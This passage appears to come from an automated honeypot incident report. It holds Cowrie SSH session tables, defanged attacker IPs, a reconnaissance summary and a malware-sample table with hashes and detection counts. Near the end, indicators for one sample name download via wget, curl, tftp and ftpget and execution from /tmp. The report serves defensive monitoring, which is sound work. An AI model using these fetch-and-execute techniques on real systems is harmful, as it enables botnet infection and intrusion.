- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b823b6f335eb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:52 |
| **Last Seen** | 2026-07-19 10:53 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:52:45` | `cowrie.session.connect` |
| `2026-07-19 10:52:46` | `cowrie.client.version` |
| `2026-07-19 10:52:46` | `cowrie.client.kex` |
| `2026-07-19 10:52:55` | `cowrie.login.success` |
| `2026-07-19 10:53:00` | `cowrie.session.params` |
| `2026-07-19 10:53:00` | `cowrie.command.input` |
| `2026-07-19 10:53:06` | `cowrie.log.closed` |
| `2026-07-19 10:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c4a57f4e9b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:52 |
| **Last Seen** | 2026-07-19 10:53 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:52:55` | `cowrie.session.connect` |
| `2026-07-19 10:52:57` | `cowrie.client.version` |
| `2026-07-19 10:52:57` | `cowrie.client.kex` |
| `2026-07-19 10:53:12` | `cowrie.login.success` |
| `2026-07-19 10:53:16` | `cowrie.session.params` |
| `2026-07-19 10:53:16` | `cowrie.command.input` |
| `2026-07-19 10:53:19` | `cowrie.log.closed` |
| `2026-07-19 10:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71f985af85bd

| Field | Detail |
|---|---|
| **Source IP** | `125.20.207[.]154` |
| **First Seen** | 2026-07-19 10:52 |
| **Last Seen** | 2026-07-19 10:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:52:55` | `cowrie.session.connect` |
| `2026-07-19 10:52:56` | `cowrie.client.version` |
| `2026-07-19 10:52:56` | `cowrie.client.kex` |
| `2026-07-19 10:52:58` | `cowrie.login.success` |
| `2026-07-19 10:52:58` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:53:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.20.207[.]154` to AbuseIPDB if not already reported
- [ ] Block `125.20.207[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcdbca77d592

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:53 |
| **Last Seen** | 2026-07-19 10:53 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:53:12` | `cowrie.session.connect` |
| `2026-07-19 10:53:14` | `cowrie.client.version` |
| `2026-07-19 10:53:14` | `cowrie.client.kex` |
| `2026-07-19 10:53:21` | `cowrie.login.success` |
| `2026-07-19 10:53:24` | `cowrie.session.params` |
| `2026-07-19 10:53:24` | `cowrie.command.input` |
| `2026-07-19 10:53:26` | `cowrie.log.closed` |
| `2026-07-19 10:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0e09fac27cf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:53 |
| **Last Seen** | 2026-07-19 10:53 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:53:24` | `cowrie.session.connect` |
| `2026-07-19 10:53:26` | `cowrie.client.version` |
| `2026-07-19 10:53:26` | `cowrie.client.kex` |
| `2026-07-19 10:53:33` | `cowrie.login.success` |
| `2026-07-19 10:53:39` | `cowrie.session.params` |
| `2026-07-19 10:53:39` | `cowrie.command.input` |
| `2026-07-19 10:53:41` | `cowrie.log.closed` |
| `2026-07-19 10:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8663473653f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:53 |
| **Last Seen** | 2026-07-19 10:54 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:53:39` | `cowrie.session.connect` |
| `2026-07-19 10:53:40` | `cowrie.client.version` |
| `2026-07-19 10:53:40` | `cowrie.client.kex` |
| `2026-07-19 10:53:53` | `cowrie.login.success` |
| `2026-07-19 10:53:58` | `cowrie.session.params` |
| `2026-07-19 10:53:58` | `cowrie.command.input` |
| `2026-07-19 10:54:02` | `cowrie.log.closed` |
| `2026-07-19 10:54:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12acbef40bf5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:53 |
| **Last Seen** | 2026-07-19 10:54 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:53:45` | `cowrie.session.connect` |
| `2026-07-19 10:53:49` | `cowrie.client.version` |
| `2026-07-19 10:53:49` | `cowrie.client.kex` |
| `2026-07-19 10:54:03` | `cowrie.login.success` |
| `2026-07-19 10:54:07` | `cowrie.session.params` |
| `2026-07-19 10:54:07` | `cowrie.command.input` |
| `2026-07-19 10:54:10` | `cowrie.log.closed` |
| `2026-07-19 10:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b121c0468ab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:54 |
| **Last Seen** | 2026-07-19 10:54 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:54:03` | `cowrie.session.connect` |
| `2026-07-19 10:54:05` | `cowrie.client.version` |
| `2026-07-19 10:54:05` | `cowrie.client.kex` |
| `2026-07-19 10:54:16` | `cowrie.login.success` |
| `2026-07-19 10:54:23` | `cowrie.session.params` |
| `2026-07-19 10:54:23` | `cowrie.command.input` |
| `2026-07-19 10:54:26` | `cowrie.log.closed` |
| `2026-07-19 10:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8caf2fbd805f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:54 |
| **Last Seen** | 2026-07-19 10:54 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:54:16` | `cowrie.session.connect` |
| `2026-07-19 10:54:18` | `cowrie.client.version` |
| `2026-07-19 10:54:18` | `cowrie.client.kex` |
| `2026-07-19 10:54:33` | `cowrie.login.success` |
| `2026-07-19 10:54:42` | `cowrie.session.params` |
| `2026-07-19 10:54:42` | `cowrie.command.input` |
| `2026-07-19 10:54:45` | `cowrie.log.closed` |
| `2026-07-19 10:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8acd948ed02

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:54 |
| **Last Seen** | 2026-07-19 10:54 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:54:27` | `cowrie.session.connect` |
| `2026-07-19 10:54:31` | `cowrie.client.version` |
| `2026-07-19 10:54:31` | `cowrie.client.kex` |
| `2026-07-19 10:54:45` | `cowrie.login.success` |
| `2026-07-19 10:54:49` | `cowrie.session.params` |
| `2026-07-19 10:54:49` | `cowrie.command.input` |
| `2026-07-19 10:54:51` | `cowrie.log.closed` |
| `2026-07-19 10:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48de053aed78

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:54 |
| **Last Seen** | 2026-07-19 10:54 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:54:45` | `cowrie.session.connect` |
| `2026-07-19 10:54:47` | `cowrie.client.version` |
| `2026-07-19 10:54:47` | `cowrie.client.kex` |
| `2026-07-19 10:54:52` | `cowrie.login.success` |
| `2026-07-19 10:54:56` | `cowrie.session.params` |
| `2026-07-19 10:54:56` | `cowrie.command.input` |
| `2026-07-19 10:54:58` | `cowrie.log.closed` |
| `2026-07-19 10:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0e11bcb96b1

| Field | Detail |
|---|---|
| **Source IP** | `208.109.38[.]143` |
| **First Seen** | 2026-07-19 10:54 |
| **Last Seen** | 2026-07-19 10:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:54:48` | `cowrie.session.connect` |
| `2026-07-19 10:54:49` | `cowrie.client.version` |
| `2026-07-19 10:54:49` | `cowrie.client.kex` |
| `2026-07-19 10:54:50` | `cowrie.login.success` |
| `2026-07-19 10:54:51` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.109.38[.]143` to AbuseIPDB if not already reported
- [ ] Block `208.109.38[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56983d701765

| Field | Detail |
|---|---|
| **Source IP** | `31.173.0[.]46` |
| **First Seen** | 2026-07-19 10:54 |
| **Last Seen** | 2026-07-19 10:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:54:56` | `cowrie.session.connect` |
| `2026-07-19 10:54:57` | `cowrie.client.version` |
| `2026-07-19 10:54:57` | `cowrie.client.kex` |
| `2026-07-19 10:54:58` | `cowrie.login.success` |
| `2026-07-19 10:54:58` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.0[.]46` to AbuseIPDB if not already reported
- [ ] Block `31.173.0[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `117.34.85[.]168` | **25** | 2026-07-19 08:56 | 2026-07-19 10:54 | 46m | 0 | `T1592` | 🟠 MEDIUM |
| `88.214.25[.]124` | **6** | 2026-07-19 08:55 | 2026-07-19 10:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-19 09:07 | 2026-07-19 10:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `179.61.192[.]156` | **3** | 2026-07-19 09:54 | 2026-07-19 10:33 | 2m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **3** | 2026-07-19 09:26 | 2026-07-19 09:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-07-19 10:42 | 2026-07-19 10:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `43.108.8[.]167` | **3** | 2026-07-19 09:03 | 2026-07-19 09:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.152.99[.]77` | **3** | 2026-07-19 09:13 | 2026-07-19 09:17 | 4m | 0 | `T1592` | 🟢 LOW |
| `91.92.42[.]19` | **2** | 2026-07-19 09:40 | 2026-07-19 10:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.216[.]185` | 1 | 2026-07-19 09:09 | 2026-07-19 09:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.86.227[.]79` | 1 | 2026-07-19 10:03 | 2026-07-19 10:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.52.18[.]252` | 1 | 2026-07-19 10:41 | 2026-07-19 10:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.202.146[.]144` | 1 | 2026-07-19 10:31 | 2026-07-19 10:31 | 6s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-07-19 10:38 | 2026-07-19 10:38 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `184.105.247[.]254` | 1 | 2026-07-19 10:43 | 2026-07-19 10:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.23.95[.]9` | 1 | 2026-07-19 10:17 | 2026-07-19 10:17 | 5s | 0 | `T1592` | 🟢 LOW |
| `223.83.114[.]88` | 1 | 2026-07-19 10:53 | 2026-07-19 10:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.202.9[.]133` | 1 | 2026-07-19 09:37 | 2026-07-19 09:37 | 40s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-07-19 10:02 | 2026-07-19 10:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-07-19 09:50 | 2026-07-19 09:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.101.137[.]46` | 1 | 2026-07-19 09:59 | 2026-07-19 09:59 | 8s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]60` | 1 | 2026-07-19 10:53 | 2026-07-19 10:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.134.124[.]8` | 1 | 2026-07-19 09:54 | 2026-07-19 09:54 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 39/100 | 🟢 LOW | **24/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 59/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5ea3509f840f6cc8b36e4930c7f6514253c3be358c7f83683c021d51fe6a2b97` | ELF Binary (Linux executable) (x86 32-bit) | `5ea3509f840f6cc8...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
